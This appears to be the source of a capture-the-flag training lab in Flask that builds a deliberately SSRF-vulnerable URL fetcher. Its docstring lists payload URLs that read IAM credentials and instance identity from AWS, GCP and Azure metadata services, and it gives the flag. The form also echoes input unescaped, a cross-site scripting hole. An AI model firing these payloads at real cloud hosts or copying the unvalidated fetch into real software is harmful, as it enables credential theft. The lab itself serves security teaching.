"""
SSRF Lab 12: AWS Metadata Service
Difficulty: 3 (Advanced)
Points: 100

Description:
SSRF to access AWS EC2 metadata service.
"""

from flask import Flask, request
import requests

app = Flask(__name__)

# Simulated AWS metadata endpoint
METADATA = {
    'iam/info': {'arn': 'arn:aws:iam::123456789:role/MyRole'},
    'iam/credentials/MyRole': {'AccessKeyId': 'AKIAIOSFODNN7EXAMPLE', 'SecretAccessKey': 'SECRET'},
}

@app.route('/')
def index():
    """
    VULNERABLE: AWS metadata service access
    
    Attack Vector:
    /?url=http://169.254.169.254/latest/meta-data/
    /?url=http://169.254.169.254/latest/meta-data/iam/info
    /?url=http://169.254.169.254/latest/meta-data/iam/credentials/MyRole
    /?url=http://169.254.169.254/latest/user-data/
    /?url=http://169.254.169.254/latest/dynamic/instance-identity/document
    
    Also works on Azure, GCP:
    /?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
    /?url=http://169.254.169.254/metadata/v1/iam/info
    
    Flag: FLAG{ssrf_aws_metadata_012}
    """
    url = request.args.get('url', '')
    content = None
    error = None
    
    if url:
        try:
            response = requests.get(url, timeout=5, headers={'Metadata-Flavor': 'Google'})
            content = response.text[:1000]
        except Exception as e:
            error = str(e)
    
    return f"""
    <html>
    <body>
        <h1>Cloud Metadata Accessor</h1>
        <form method="GET">
            <input type="text" name="url" placeholder="Metadata URL" size="70" value="{url}">
            <button>Fetch</button>
        </form>
        {f"<pre>{content}</pre>" if content else ""}
        {f"<p style='color:red;'>{error}</p>" if error else ""}
    </body>
    </html>
    """

@app.route('/metadata/<path:path>')
def metadata(path):
    """Simulate AWS metadata service"""
    if path in METADATA:
        return METADATA[path]
    return {}, 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5012, debug=False)
